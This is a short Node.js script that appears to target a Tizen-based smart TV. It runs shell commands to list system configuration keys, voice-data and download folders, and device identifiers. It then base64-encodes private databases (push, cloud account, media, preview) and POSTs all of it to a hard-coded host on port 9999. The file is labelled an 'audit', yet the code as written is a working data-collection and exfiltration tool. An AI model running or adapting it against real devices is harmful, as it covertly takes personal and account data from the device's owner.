"use strict";

var cp = require("child_process");
var http = require("http");
var fs = require("fs");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

function b64(path) {
    try {
        return fs.readFileSync(path).toString("base64");
    } catch (e) {
        return "ERR " + e.message;
    }
}

var out = {};
out.started = new Date().toISOString();

out.buxton_keys = run("buxton2ctl list-keys system 2>&1 | head -500");
out.voice_share = run("ls -laR /home/owner/share/.voice 2>/dev/null; ls -laR /home/owner/share/.voice/* 2>/dev/null | head -40");
out.vd_tcpdump = run("head -60 /usr/sbin/vd-tcpdump");
out.context_data = run("ls -laR /opt/usr/apps/context-aware-service/data 2>/dev/null | head -50; find /opt/usr/apps/epg /opt/usr/apps/tvs-guide -type f 2>/dev/null | head -40");
out.tizenid = run("cat /opt/etc/tizenid 2>/dev/null; head -30 /opt/etc/prd_info.ini 2>/dev/null");
out.dload = run("ls -laR /home/owner/share/DownloadManager 2>/dev/null | head -40");

var files = {};
files.push_db = b64("/opt/usr/dbspace/.push.db");
files.cloud_pdm = b64("/opt/usr/home/owner/.applications/dbspace/.cloud_pdm.db");
files.media_db = b64("/opt/usr/home/owner/.applications/dbspace/.media.db");
files.preview_db = b64("/home/owner/share/.preview.db");
files.preview_sqlite = b64("/home/owner/share/.preview.db.sqlite");
files.global_function = b64("/home/owner/share/global-function.db");

post("/audit4_files", files);
post("/audit4", out);
